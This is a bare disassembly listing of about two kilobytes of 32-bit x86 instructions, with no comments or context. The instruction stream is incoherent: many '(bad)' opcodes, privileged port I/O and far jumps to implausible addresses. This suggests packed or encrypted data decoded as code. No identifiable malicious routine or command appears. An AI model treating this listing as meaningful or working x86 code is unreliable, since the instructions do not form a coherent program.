  4146a1:	and    al,0x43
  4146a3:	xchg   ecx,eax
  4146a4:	or     dl,BYTE PTR [ecx-0x57b5cec2]
  4146aa:	aaa    
  4146ab:	sbb    ecx,edx
  4146ad:	add    al,BYTE PTR ds:0xa7da59c5
  4146b3:	idiv   BYTE PTR [edi+edi*4]
  4146b6:	lods   eax,DWORD PTR ds:[esi]
  4146b7:	outs   dx,BYTE PTR ds:[esi]
  4146b8:	dec    ebp
  4146b9:	dec    ebp
  4146ba:	push   edi
  4146bb:	pop    es
  4146bc:	mov    ebx,0xdcb85fc7
  4146c1:	jp     0x4146a8
  4146c3:	cdq    
  4146c4:	xchg   edi,eax
  4146c5:	and    eax,0xdeec1097
  4146ca:	nop
  4146cb:	cmp    esi,DWORD PTR [ebx-0x66bdfc1b]
  4146d1:	push   ecx
  4146d2:	scas   eax,DWORD PTR es:[edi]
  4146d3:	jmp    0x6e3e:0xce9dbc0f
  4146da:	test   BYTE PTR [edi+0x55],al
  4146dd:	(bad)  [eax+0x22]
  4146e0:	push   ss
  4146e1:	ror    BYTE PTR [edi-0x70],1
  4146e4:	adc    ecx,edi
  4146e6:	ss cwde 
  4146e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146e9:	mov    dh,0x3b
  4146eb:	das    
  4146ec:	les    eax,FWORD PTR [ebp+0x28]
  4146ef:	aam    0x4c
  4146f1:	in     al,0x98
  4146f3:	xchg   edx,eax
  4146f4:	clc    
  4146f5:	cmp    eax,0x3ba9d118
  4146fa:	xchg   BYTE PTR [edx],bh
  4146fc:	and    ebx,DWORD PTR ss:[edx]
  4146ff:	int    0x65
  414701:	mov    esi,0xd6d4ff8c
  414706:	and    dh,BYTE PTR [edi]
  414708:	inc    ecx
  414709:	imul   BYTE PTR [eax+ebx*2-0xa]
  41470d:	sub    DWORD PTR [edi-0x2e],ebp
  414710:	ficom  WORD PTR [esi-0x19e7fa50]
  414716:	aad    0x42
  414718:	ror    cl,1
  41471a:	mov    bh,0xd8
  41471c:	add    ch,al
  41471e:	clc    
  41471f:	push   ebx
  414720:	shl    DWORD PTR [edx+eax*8],cl
  414723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414724:	add    al,0x7f
  414726:	add    ah,BYTE PTR [esp+eax*4+0x26]
  41472a:	lock inc ebx
  41472c:	and    al,0x2
  41472e:	pusha  
  41472f:	jmp    0x4146e2
  414731:	das    
  414732:	add    al,0xa5
  414734:	pop    edi
  414735:	jmp    0x78b5:0x27d3cf4d
  41473c:	jmp    0x414755
  41473e:	add    cl,dh
  414740:	mov    ebx,0x1da124ab
  414745:	aas    
  414746:	xor    eax,0xbcb984e9
  41474b:	iret   
  41474c:	mov    ch,0x7
  41474e:	test   al,0x7f
  414750:	es inc edx
  414752:	mov    ds:0x715b39e2,eax
  414757:	cli    
  414758:	loope  0x4147a3
  41475a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41475b:	cdq    
  41475c:	stos   BYTE PTR es:[edi],al
  41475d:	dec    ebx
  41475e:	sbb    esp,ecx
  414760:	xchg   ebp,eax
  414761:	aad    0x46
  414763:	es mov esp,0xb22a929a
  414769:	and    bl,BYTE PTR [eax+eiz*1-0xf4bb5bc]
  414770:	pop    eax
  414771:	shl    BYTE PTR [esi+0x15],cl
  414774:	sub    edi,esi
  414776:	(bad)  [ebx]
  414778:	push   ebp
  414779:	mov    cl,0x59
  41477b:	ret    0x8811
  41477e:	ins    BYTE PTR es:[edi],dx
  41477f:	not    cl
  414781:	xrelease mov BYTE PTR [ebx-0x18c1a98],al
  414788:	das    
  414789:	aam    0x44
  41478b:	and    ebx,DWORD PTR [ecx-0x56e56c25]
  414791:	jmp    0xde930777
  414796:	inc    edx
  414797:	in     eax,0xce
  414799:	mov    edx,0x30b66cf0
  41479e:	clc    
  41479f:	sbb    edi,DWORD PTR [edx-0x69]
  4147a2:	and    ah,BYTE PTR [ecx]
  4147a4:	adc    esi,DWORD PTR gs:[ebx]
  4147a7:	adc    bh,dl
  4147a9:	lds    esi,FWORD PTR [bx+si-0x2378]
  4147ae:	(bad)  
  4147af:	out    dx,eax
  4147b0:	mov    ah,0x2a
  4147b2:	pop    ebp
  4147b3:	mov    esi,0x6b137c10
  4147b8:	lahf   
  4147b9:	and    ebx,DWORD PTR [ebp+0x70]
  4147bc:	and    BYTE PTR [ecx],cl
  4147be:	sub    al,cl
  4147c0:	xchg   esi,eax
  4147c1:	test   DWORD PTR [esi+ecx*4-0x5e],esp
  4147c5:	lds    edi,FWORD PTR [eax]
  4147c7:	pusha  
  4147c8:	jne    0x41479f
  4147ca:	xchg   edi,eax
  4147cb:	sbb    esp,ebx
  4147cd:	add    ecx,DWORD PTR [edi+ebx*8+0x155267cc]
  4147d4:	(bad)  
  4147d5:	jno    0x414768
  4147d7:	pop    esp
  4147d8:	in     al,0x41
  4147da:	fprem1 
  4147dc:	popf   
  4147dd:	fstp   QWORD PTR ds:[eax+0x88f928b]
  4147e4:	out    dx,al
  4147e5:	inc    esp
  4147e6:	and    BYTE PTR [edx+ebp*8],bh
  4147e9:	pop    ebx
  4147ea:	fld    st(6)
  4147ec:	or     dh,BYTE PTR [ecx]
  4147ee:	leave  
  4147ef:	mov    bh,0x84
  4147f1:	or     edx,DWORD PTR [ebp-0x45]
  4147f4:	or     DWORD PTR [di+0x3216],edx
  4147f9:	push   ds
  4147fa:	retf   0xe494
  4147fd:	jne    0x414826
  4147ff:	fcomi  st,st(2)
  414801:	outs   dx,BYTE PTR ds:[esi]
  414802:	cmp    ch,BYTE PTR [ecx]
  414804:	and    ebp,ebp
  414806:	cli    
  414807:	mov    ebp,0x6a953221
  41480c:	mov    BYTE PTR [eax-0x2c],0x5d
  414810:	lods   eax,DWORD PTR ds:[esi]
  414811:	ss or  edi,edx
  414814:	in     eax,0x12
  414816:	jb     0x414836
  414818:	jge    0x41480a
  41481a:	cdq    
  41481b:	xor    al,0x11
  41481d:	jne    0x41484a
  41481f:	push   edi
  414820:	lock xor BYTE PTR [esi],0xb7
  414824:	rcl    BYTE PTR [eax],1
  414826:	cmp    DWORD PTR [edi-0x5ab3187b],edx
  41482c:	cdq    
  41482d:	and    bh,0xf5
  414830:	pop    eax
  414831:	pop    ebx
  414832:	and    eax,DWORD PTR [esi+esi*1]
  414835:	inc    ebx
  414836:	loopne 0x4147cd
  414838:	jo     0x4147ef
  41483a:	cmp    DWORD PTR [ecx],0x81e06794
  414840:	adc    al,0x65
  414842:	hlt    
  414843:	lods   eax,DWORD PTR ds:[esi]
  414844:	sar    WORD PTR [ecx],0x10
  414848:	sbb    edx,DWORD PTR [ebx+0x17]
  41484b:	dec    edi
  41484c:	mov    edi,0x915e6f25
  414851:	push   edx
  414852:	push   0x9a57ba21
  414857:	xchg   edx,eax
  414858:	pop    esi
  414859:	adc    ch,cl
  41485b:	inc    edx
  41485c:	std    
  41485d:	jg     0x414823
  41485f:	and    al,0xf5
  414861:	inc    eax
  414862:	test   al,dh
  414864:	outs   dx,DWORD PTR ds:[esi]
  414865:	mov    esi,0xed68d0e7
  41486a:	xchg   esp,eax
  41486b:	outs   dx,BYTE PTR ds:[esi]
  41486c:	(bad)  [edi-0x2dfb5ee3]
  414872:	rol    DWORD PTR [eax+0x3ce452e8],cl
  414878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41487a:	adc    DWORD PTR [ebx],ebp
  41487c:	mov    al,ds:0x34c31854
  414881:	cmp    eax,0xddab7ecf
  414886:	adc    al,0x6a
  414888:	push   ebp
  414889:	jmp    0xf2c0b5c3
  41488e:	loop   0x4148f9
  414890:	bound  ecx,QWORD PTR [eax]
  414892:	(bad)  
  414893:	dec    ebp
  414894:	inc    ebp
  414895:	jmp    0xf04d:0x130ad919
  41489c:	test   al,0xda
  41489e:	inc    esp
  41489f:	shr    ebp,1
  4148a1:	xor    bh,BYTE PTR [ecx-0x4b94e498]
  4148a7:	cmp    ch,BYTE PTR [edi-0xc714702]
  4148ad:	ficomp DWORD PTR [ebx]
  4148af:	xchg   BYTE PTR [esp+eax*4+0x27],dl
  4148b3:	dec    edi
  4148b4:	(bad)  
  4148b5:	and    al,0x43
  4148b7:	push   esp
  4148b8:	pop    esi
  4148b9:	fcmovbe st,st(1)
  4148bb:	xchg   esi,eax
  4148bc:	inc    esi
  4148bd:	imul   ebx,DWORD PTR [esi+0x24],0x3bca3278
  4148c4:	inc    ebp
  4148c5:	mov    dh,0xab
  4148c7:	cld    
  4148c8:	enter  0x6bc2,0x1d
  4148cc:	stos   DWORD PTR es:[edi],eax
  4148cd:	imul   ebx,esi,0xf981e094
  4148d3:	mov    BYTE PTR ds:0xf6538698,cl
  4148d9:	or     BYTE PTR [ebp+0x6c],dh
  4148dc:	js     0x41492a
  4148de:	xchg   BYTE PTR [eax-0x3483cdb],bl
  4148e4:	jo     0x414925
  4148e6:	mov    ecx,0xe877dacd
  4148eb:	(bad)  
  4148ec:	jmp    0x4148a1
  4148ee:	xchg   esi,eax
  4148ef:	xchg   edi,eax
  4148f0:	and    al,BYTE PTR [edi+eax*1-0x1774a88c]
  4148f7:	rol    ebp,1
  4148f9:	rol    dl,1
  4148fb:	sub    ecx,DWORD PTR [ebp+0xc3cdc74]
  414901:	push   cs
  414902:	pop    ss
  414903:	sub    BYTE PTR ds:0x74a5b167,dh
  414909:	jl     0x414965
  41490b:	bound  ebx,QWORD PTR [eax]
  41490d:	test   DWORD PTR [esi-0x13],0xed3459ec
  414914:	add    edi,ebp
  414916:	fmul   st(2),st
  414918:	outs   dx,DWORD PTR ds:[esi]
  414919:	cmp    ecx,edx
  41491b:	arpl   WORD PTR [edx+0x27a0f0ec],di
  414921:	pop    es
  414922:	nop
  414923:	mov    ds:0x1c2d56cf,al
  414928:	jnp    0x414984
  41492a:	pop    edi
  41492b:	sahf   
  41492c:	inc    ebx
  41492d:	xchg   ecx,eax
  41492e:	sbb    DWORD PTR [ecx*1+0x3792e0d3],esp
  414935:	xlat   BYTE PTR ds:[ebx]
  414936:	mov    edx,0x2b82eca7
  41493b:	stos   DWORD PTR es:[edi],eax
  41493c:	jno    0x414906
  41493e:	push   ebp
  41493f:	scas   eax,DWORD PTR es:[edi]
  414940:	arpl   cx,dx
  414942:	pop    edx
  414943:	add    cl,BYTE PTR [edi+eax*4]
  414946:	mov    eax,DWORD PTR [esi]
  414948:	adc    edi,DWORD PTR [edi-0x5c]
  41494b:	out    dx,al
  41494c:	loop   0x4149c1
  41494e:	mov    dh,0xb6
  414950:	push   edi
  414951:	and    al,0x63
  414953:	sbb    BYTE PTR [edx-0x31],ch
  414956:	sbb    eax,0xd5053c93
  41495b:	or     eax,0xf07124ac
  414960:	je     0x414993
  414962:	sub    bl,dh
  414964:	mov    cl,0xf7
  414966:	fcomip st,st(6)
  414968:	push   ecx
  414969:	aas    
  41496a:	fisub  DWORD PTR [eax+0x4def8fc2]
  414970:	int3   
  414971:	loopne 0x4149c7
  414973:	or     cl,al
  414975:	or     BYTE PTR [ecx],0xe8
  414978:	push   ebp
  414979:	mov    DWORD PTR [ebp+0x1447fa59],0x7c65cece
  414983:	mov    bl,0xe
  414985:	repnz es mov eax,0x2cdcbb80
  41498c:	daa    
  41498d:	test   BYTE PTR [ebx+0x79f0f7d1],ch
  414993:	jmp    0xd1664761
  414998:	jns    0x414995
  41499a:	inc    eax
  41499b:	fcomp  DWORD PTR [edx-0x2f]
  41499e:	not    BYTE PTR ds:0x22616a24
  4149a4:	ror    DWORD PTR [edx+0x919a207],0x3d
  4149ab:	mov    esi,edx
  4149ad:	push   edx
  4149ae:	fldcw  WORD PTR [ebp+0x2640ca5e]
  4149b4:	inc    ebp
  4149b5:	push   0x1a676b6f
  4149ba:	sub    BYTE PTR [edi-0x700fba44],0x8a
  4149c1:	fwait
  4149c2:	dec    edi
  4149c3:	push   esp
  4149c4:	aam    0x89
  4149c6:	cdq    
  4149c7:	pop    esi
  4149c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149c9:	fistp  WORD PTR [ecx-0x1e130796]
  4149cf:	add    dl,0xb7
  4149d2:	adc    DWORD PTR [eax+0x7970e765],0x5a
  4149d9:	mov    ah,0x97
  4149db:	push   ecx
  4149dc:	shr    BYTE PTR [edx-0x128bbfd2],0xc4
  4149e3:	sqrtps xmm1,XMMWORD PTR [esi+0x1e837995]
  4149ea:	sub    BYTE PTR [esi],al
  4149ec:	lds    ecx,FWORD PTR [eax]
  4149ee:	xor    ebp,0x8eb28dba
  4149f4:	es ss (bad) 
  4149f7:	pop    ss
  4149f8:	adc    DWORD PTR [ebp+eiz*4+0x1f2ac462],edx
  4149ff:	vmread ebp,esi
  414a02:	jns    0x414995
  414a04:	and    esp,esi
  414a06:	or     DWORD PTR [eax-0x5e1f0fcf],0xffffffeb
  414a0d:	xchg   edx,eax
  414a0e:	jp     0x414a69
  414a10:	inc    eax
  414a11:	xchg   ebp,eax
  414a12:	fs pop ds
  414a14:	xchg   DWORD PTR [eax-0x3a],ebp
  414a17:	outs   dx,BYTE PTR ds:[esi]
  414a18:	addr16 repnz push sp
  414a1c:	test   al,0xec
  414a1e:	and    cl,BYTE PTR [edx]
  414a20:	out    0x4e,eax
  414a22:	pop    es
  414a23:	cvttps2pi mm4,QWORD PTR [edi+0x264c693d]
  414a2a:	cmp    BYTE PTR [ebx-0x5609cb79],0xe1
  414a31:	(bad)  
  414a32:	fcmovne st,st(4)
  414a34:	cld    
  414a35:	test   ecx,ebx
  414a37:	leave  
  414a38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a39:	ja     0x414a97
  414a3b:	int3   
  414a3c:	arpl   WORD PTR ds:0x90ae2ab9,ax
  414a42:	jle    0x414ab1
  414a44:	sub    al,0x59
  414a46:	xchg   DWORD PTR ds:0x5d34,esp
  414a4b:	(bad)  
  414a4c:	mov    ebp,0x9531c3d7
  414a51:	sbb    eax,0xdbe6e91
  414a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a57:	test   DWORD PTR [esi-0x19],eax
  414a5a:	repz and esi,DWORD PTR [ecx-0x668845f2]
  414a61:	sub    BYTE PTR [ebx-0x2342f4bb],cl
  414a67:	sbb    BYTE PTR [ecx+0x24ef3002],bl
  414a6d:	js     0x414a10
  414a6f:	xchg   BYTE PTR [ebx],dl
  414a71:	jecxz  0x414a3b
  414a73:	outs   dx,BYTE PTR ds:[esi]
  414a74:	mov    eax,0x5c3c97e3
  414a79:	fld    TBYTE PTR [ecx-0x6a]
  414a7c:	inc    ecx
  414a7d:	js     0x414a95
  414a7f:	push   esi
  414a80:	sbb    DWORD PTR [ebx],ebx
  414a82:	adc    BYTE PTR [ebp-0xb],bl
  414a85:	cmp    ch,bh
  414a87:	pop    es
  414a88:	xchg   esi,eax
  414a89:	sahf   
  414a8a:	sub    ah,BYTE PTR [eax+ebp*2+0x47]
  414a8e:	(bad)  
  414a8f:	push   0x72
  414a91:	fisttp QWORD PTR [ecx-0x18bd5703]
  414a97:	out    dx,eax
  414a98:	fs jae 0x414a6d
  414a9b:	sub    al,0x9e
  414a9d:	mov    edx,0x21e8b82f
  414aa2:	mov    dl,0x93
  414aa4:	repnz aas 
  414aa6:	inc    eax
  414aa7:	mov    al,0xce
  414aa9:	jns    0x414af5
  414aab:	retf   0xdd2e
  414aae:	or     al,0x89
  414ab0:	fisttp WORD PTR [edx+0x30]
  414ab3:	test   BYTE PTR ds:0x902ba576,bh
  414ab9:	(bad)  
  414aba:	iret   
  414abb:	in     eax,0xd5
  414abd:	cdq    
  414abe:	mov    esp,0xc3d1eb02
  414ac3:	in     eax,0x1d
  414ac5:	ret    
  414ac6:	fcomi  st,st(6)
  414ac8:	mov    esi,0x3feb7653
  414acd:	cmp    eax,0x7c6d65f1
  414ad2:	pop    ebp
  414ad3:	dec    edx
  414ad4:	or     al,BYTE PTR [eax]
  414ad6:	ficomp DWORD PTR [eax+0x6f]
  414ad9:	ficom  WORD PTR [eax]
  414adb:	jle    0x414a6f
  414add:	add    eax,edx
  414adf:	repz rcl BYTE PTR [esi-0x42],cl
  414ae3:	sti    
  414ae4:	jne    0x414ab0
  414ae6:	scas   al,BYTE PTR es:[edi]
  414ae7:	pop    ecx
  414ae8:	sub    BYTE PTR [edx+0x2b],0xdb
  414aec:	mov    dl,BYTE PTR [esp+edi*4-0x1bed82e]
  414af3:	add    BYTE PTR [ebx],al
  414af5:	dec    edx
  414af6:	jl     0x414aaa
  414af8:	out    dx,al
  414af9:	(bad)  
  414afa:	int    0x6
  414afc:	mov    eax,ds:0xc977aa7d
  414b01:	call   0xa255a6f6
  414b06:	ret    0xb303
  414b09:	es (bad) 
  414b0b:	xchg   ecx,eax
  414b0c:	mov    fs,WORD PTR [eax]
  414b0e:	scas   al,BYTE PTR es:[edi]
  414b0f:	test   DWORD PTR [ebp-0x2c],ebp
  414b12:	cmp    ah,BYTE PTR [ecx]
  414b14:	push   cs
  414b15:	call   0x782b4e91
  414b1a:	push   esp
  414b1b:	cmp    ch,dh
  414b1d:	jae    0x414b88
  414b1f:	aas    
  414b20:	xchg   di,ax
  414b22:	cmovge ebx,ecx
  414b25:	loop   0x414b9b
  414b27:	jns    0x414af0
  414b29:	mov    al,0xa9
  414b2b:	not    DWORD PTR gs:[edi+0x78bcfb57]
  414b32:	or     BYTE PTR [eax],bl
  414b34:	jno    0x414b6a
  414b36:	cmp    al,0x83
  414b38:	jb     0x414b63
  414b3a:	mov    eax,ds:0x345e3279
  414b3f:	mov    bl,ah
  414b41:	push   eax
  414b42:	pop    ecx
  414b43:	mov    ecx,0xdc24ef0e
  414b48:	push   0xffffffa7
  414b4a:	fist   WORD PTR [edi+0x72f41c9]
  414b50:	(bad)  [esi]
  414b52:	jle    0x414b5e
  414b54:	mov    ecx,0x37f41642
  414b59:	sar    DWORD PTR [ebx+0x21],1
  414b5c:	les    ebx,FWORD PTR ds:0xfbf86205
  414b62:	mov    esi,0xfc1dca61
  414b67:	pop    edx
  414b68:	hlt    
  414b69:	aam    0xb2
  414b6b:	pop    edx
  414b6c:	and    ecx,eax
  414b6e:	push   0xffffff9c
  414b70:	sbb    al,0x43
  414b72:	(bad)  
  414b74:	pop    ecx
  414b75:	jge    0x414b18
  414b77:	xor    bh,BYTE PTR [esi*8+0x7bd87c51]
  414b7e:	fcom   QWORD PTR [edx-0x5d]
  414b81:	xor    BYTE PTR [esi+eax*1-0x15c6672c],cl
  414b88:	sub    esp,DWORD PTR [eax]
  414b8a:	call   0x787f:0x91aaf516
  414b91:	and    bl,BYTE PTR [edi+0x5c]
  414b94:	fstp   TBYTE PTR [ebx-0x29]
  414b97:	jge    0x414c09
  414b99:	fld    DWORD PTR [eax-0x6b4323a3]
  414b9f:	rol    DWORD PTR [eax-0x7a],cl
  414ba2:	pop    ebp
  414ba3:	pop    ds
  414ba4:	loopne 0x414b81
  414ba6:	lahf   
  414ba7:	cmp    ebx,edx
  414ba9:	lods   al,BYTE PTR ds:[esi]
  414baa:	pop    es
  414bab:	push   ebp
  414bac:	(bad)  
  414bad:	(bad)  
  414bae:	xchg   esi,eax
  414baf:	mov    esi,0x9e37bd05
  414bb4:	mov    dh,0x8e
  414bb6:	jp     0x414bf2
  414bb8:	ror    DWORD PTR [edx+0x51],0xc4
  414bbc:	jo     0x414bc4
  414bbe:	aas    
  414bbf:	into   
  414bc0:	pop    es
  414bc1:	and    eax,0x8979766d
  414bc6:	or     DWORD PTR [ebx-0x5],ebx
  414bc9:	inc    ebp
  414bca:	in     eax,0x2c
  414bcc:	pop    ebx
  414bcd:	rol    DWORD PTR [edi],1
  414bcf:	or     dh,BYTE PTR [edi+0xcb72819]
  414bd5:	xor    edx,0xffffff9b
  414bd8:	icebp  
  414bd9:	int    0xba
  414bdb:	adc    esp,ebx
  414bdd:	or     al,0x16
  414bdf:	push   ebx
  414be0:	mov    ch,0xa3
  414be2:	pop    edi
  414be3:	fwait
  414be4:	and    ah,BYTE PTR [edx-0x3c]
  414be7:	repnz daa 
  414be9:	sbb    DWORD PTR [eax],eax
  414beb:	(bad)  
  414bed:	push   0x6bde0e35
  414bf2:	adc    edx,DWORD PTR [eax-0x4d]
  414bf5:	aaa    
  414bf6:	push   0x8754dde
  414bfb:	bound  esi,QWORD PTR [ebx+0x42283cd1]
  414c01:	mov    dh,0x6d
  414c03:	add    al,0x1d
  414c05:	sbb    eax,0xdd9630ba
  414c0a:	cdq    
  414c0b:	fist   WORD PTR [edi-0x54019a4f]
  414c11:	xor    bl,BYTE PTR [ecx]
  414c13:	mov    cl,0xf5
  414c15:	xor    BYTE PTR [esi-0x6e],0xee
  414c19:	and    esp,ebp
  414c1b:	sti    
  414c1c:	in     eax,0x77
  414c1e:	add    ebp,ecx
  414c20:	push   ebx
  414c21:	sbb    al,0x84
  414c23:	das    
  414c24:	and    eax,0x7f4ddd27
  414c29:	in     al,0xc1
  414c2b:	(bad)  
  414c2c:	je     0x414c86
  414c2e:	inc    esp
  414c2f:	xchg   ah,ch
  414c31:	inc    eax
  414c32:	pushf  
  414c33:	mov    edx,0xbe81e1f4
  414c38:	push   0xffffffef
  414c3a:	xchg   edx,eax
  414c3b:	int    0x3c
  414c3d:	fstp   QWORD PTR [edx-0xe7421f2]
  414c43:	popf   
  414c44:	outs   dx,BYTE PTR ds:[esi]
  414c45:	lock jl 0x414c41
  414c48:	sub    cl,dl
  414c4a:	aam    0x62
  414c4c:	or     eax,0xdcaa6715
  414c51:	push   edx
  414c52:	ins    BYTE PTR es:[edi],dx
  414c53:	sbb    cl,dl
  414c55:	xchg   ebp,eax
  414c56:	test   BYTE PTR ds:0xb74d1ed1,cl
  414c5c:	in     al,0x6d
  414c5e:	mov    ss,WORD PTR [edi-0x44]
  414c61:	cmp    esi,DWORD PTR [edi+0x42fb4dbf]
  414c67:	adc    DWORD PTR [ecx+0x4f575c15],esi
  414c6d:	xchg   ebx,eax
  414c6e:	sahf   
  414c6f:	fidivr DWORD PTR [edx]
  414c71:	imul   esp,DWORD PTR ds:0xd40d28e0,0x1321431a
  414c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c7c:	es xor cl,dh
  414c7f:	sbb    edx,DWORD PTR [ebx]
  414c81:	mov    BYTE PTR [edi],0x8d
  414c84:	shl    DWORD PTR [ecx],1
  414c86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c87:	mov    ds:0xa92e7c2f,al
  414c8c:	add    DWORD PTR [eax+ebx*4],esi
  414c8f:	inc    ebp
  414c90:	xchg   esp,eax
  414c91:	sub    al,0x6b
  414c93:	js     0x414c67
  414c95:	ss jb  0x414c67
  414c98:	jecxz  0x414c7c
  414c9a:	sahf   
  414c9b:	gs call 0x719a:0x3362b738
  414ca3:	nop
  414ca4:	sbb    al,0x9f
  414ca7:	retf   0xb612
  414caa:	fstp   QWORD PTR [edx+0x327a580]
  414cb0:	sub    al,0x15
  414cb2:	and    dl,BYTE PTR [ebx]
  414cb4:	cmp    edi,0xffffff9c
  414cb7:	lods   eax,DWORD PTR ds:[esi]
  414cb8:	in     al,dx
  414cb9:	aam    0xa
  414cbb:	pop    es
  414cbc:	inc    ebp
  414cbd:	jp     0x414cd1
  414cbf:	sub    al,0xf1
  414cc1:	xor    ecx,DWORD PTR [eax-0x53]
  414cc4:	ret    
  414cc5:	mov    eax,ds:0xe64b0c8d
  414cca:	and    BYTE PTR [edx],ch
  414ccc:	push   ds
  414ccd:	aas    
  414cce:	sub    dl,BYTE PTR [edi+0x3f]
  414cd1:	mov    ebx,0xadfee7df
  414cd6:	inc    edx
  414cd7:	jle    0x414ce5
  414cd9:	call   DWORD PTR [ecx+0x6f5fbaf7]
  414cdf:	push   0x12
  414ce1:	out    0x85,eax
  414ce3:	lods   eax,DWORD PTR ds:[esi]
  414ce4:	loope  0x414d56
  414ce6:	adc    ah,BYTE PTR [edx-0x73498e8f]
  414cec:	pop    ebp
  414ced:	int3   
  414cee:	(bad)  
  414cef:	ror    DWORD PTR [edx],cl
  414cf1:	pusha  
  414cf2:	int3   
  414cf3:	(bad)  
  414cf5:	dec    edi
  414cf6:	data16 sahf 
  414cf8:	fstp   TBYTE PTR [ecx-0x2630ff4b]
  414cfe:	cmp    al,0x2b
  414d00:	(bad)  
  414d01:	js     0x414d6b
  414d03:	sahf   
  414d04:	js     0x414ca2
  414d06:	push   edx
  414d07:	sub    DWORD PTR [ebx],edx
  414d09:	int3   
  414d0a:	mov    al,0x69
  414d0c:	ins    DWORD PTR es:[edi],dx
  414d0d:	sar    DWORD PTR [eax+0x36279f6b],1
  414d13:	xor    dh,BYTE PTR [ecx]
  414d15:	scas   eax,DWORD PTR es:[edi]
  414d16:	or     eax,0x6819d368
  414d1b:	ror    BYTE PTR [edx],1
  414d1d:	add    DWORD PTR [edi-0x29baa6b],0x764cb8bb
  414d27:	sbb    esi,DWORD PTR [ecx+eiz*2+0x7d]
  414d2b:	lea    esi,[eax-0xd]
  414d2e:	xchg   ebx,eax
  414d2f:	xchg   bl,cl
  414d31:	inc    ebp
  414d32:	mov    bl,0xd7
  414d34:	jle    0x414d77
  414d36:	sbb    al,0xa3
  414d38:	cmp    cl,0x51
  414d3b:	xchg   ecx,eax
  414d3c:	jge    0x414d72
  414d3e:	enter  0xfdb0,0xe9
  414d42:	out    dx,eax
  414d43:	mov    WORD PTR [esi+0x61],ss
  414d46:	jg     0x414d86
  414d48:	pop    es
  414d49:	xchg   edx,eax
  414d4a:	mov    ebp,0xeaff34a0
  414d4f:	jg     0x414d2f
  414d51:	mov    bh,0x30
  414d53:	mov    esp,0xba8f1fe6
  414d58:	nop
  414d59:	adc    edi,DWORD PTR [edx+0x5c1193b6]
  414d5f:	pusha  
  414d60:	mov    ah,0x2d
  414d62:	lds    edx,FWORD PTR [edx]
  414d64:	inc    ebx
  414d65:	add    BYTE PTR [edi+0x2c2725a5],cl
  414d6b:	(bad)  
  414d6c:	mov    edi,0x36d81cd9
  414d71:	push   ebp
  414d72:	add    esi,edx
  414d74:	loopne 0x414d66
  414d76:	das    
  414d77:	sbb    eax,0xa6b9636d
  414d7c:	sbb    eax,DWORD PTR [ecx]
  414d7e:	mov    edi,0x315dbb86
  414d83:	jmp    0x36194ac7
  414d88:	mov    esi,DWORD PTR [eax+0x17]
  414d8b:	xchg   esi,eax
  414d8c:	push   ebx
  414d8d:	out    dx,eax
  414d8e:	out    0x6a,eax
  414d90:	mov    edx,0xcd5c09cb
  414d95:	cwde   
  414d96:	pop    esp
  414d97:	shl    DWORD PTR [eax+0xf07814e],1
  414d9d:	call   0xbdb4e2e4
  414da2:	xchg   DWORD PTR [edi],eax
  414da4:	or     dh,BYTE PTR [edx]
  414da6:	inc    eax
  414da7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414da8:	cs cwde 
  414daa:	xor    eax,0xe0e38495
  414daf:	xor    al,0x6d
  414db1:	dec    ecx
  414db2:	sbb    DWORD PTR [esp+ecx*8-0x78],ecx
  414db6:	xor    dh,0x6a
  414db9:	clc    
  414dba:	and    eax,0x557bee74
  414dbf:	mov    ebx,es
  414dc1:	xor    ebx,DWORD PTR [ebx-0x5139f9e4]
  414dc7:	pop    edx
  414dc8:	scas   al,BYTE PTR es:[edi]
  414dc9:	xor    al,0x43
  414dcb:	xor    dl,BYTE PTR [ebp+0x23]
  414dce:	jne    0x414dbd
  414dd0:	cmc    
  414dd1:	mov    ebx,0xd330d9b5
  414dd6:	js     0x414d86
  414dd8:	int    0x85
  414dda:	lds    ebp,FWORD PTR [eax]
  414ddc:	inc    BYTE PTR [edx]
  414dde:	mov    ds:0x637e7dc6,al
  414de3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414de4:	mov    bh,0xbd
  414de6:	dec    ebx
  414de7:	lds    esi,FWORD PTR [edx]
  414de9:	fidivr WORD PTR [ecx+edi*1-0x1ec4165]
  414df0:	retf   0xbecc
  414df3:	je     0x414dd0
  414df5:	retw   0xd9c5
  414df9:	xchg   BYTE PTR ds:0xfac809e3,bh
  414dff:	repz dec ebx
  414e01:	adc    DWORD PTR [esi+0x4324b9ef],0x34cdbf3c
  414e0b:	push   0xcd3f072c
  414e10:	push   cs
  414e11:	xor    bh,ah
  414e13:	popf   
  414e14:	lods   al,BYTE PTR ds:[esi]
  414e15:	fyl2x  
  414e17:	xchg   edx,eax
  414e18:	cwde   
  414e19:	test   BYTE PTR [eax],dh
  414e1b:	adc    bh,ch
  414e1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e1e:	ins    DWORD PTR es:[edi],dx
  414e1f:	imul   edi,DWORD PTR [edi-0x4a],0xa22a75e6
  414e26:	pop    ebx
  414e27:	fiadd  WORD PTR [edx]
  414e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e2a:	push   ebx
  414e2b:	jl     0x414e31
  414e2d:	(bad)  
  414e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e30:	inc    ecx
  414e31:	mov    cl,0xa8
  414e33:	mov    edi,0xa69acceb
  414e38:	inc    esi
  414e39:	leave  
  414e3a:	(bad)
  414e3f:	lea    edi,[esi]
  414e41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e42:	sti    
  414e43:	add    ebx,DWORD PTR [ebx+ecx*2+0x4]
  414e47:	xor    ecx,ebp
  414e49:	inc    ebx
  414e4a:	fs jo  0x414e2f
  414e4d:	outs   dx,BYTE PTR ds:[esi]
  414e4e:	push   ebp
  414e4f:	jge    0x414e4f
  414e51:	ret    
  414e52:	loopne 0x414e84
  414e54:	xlat   BYTE PTR ds:[ebx]
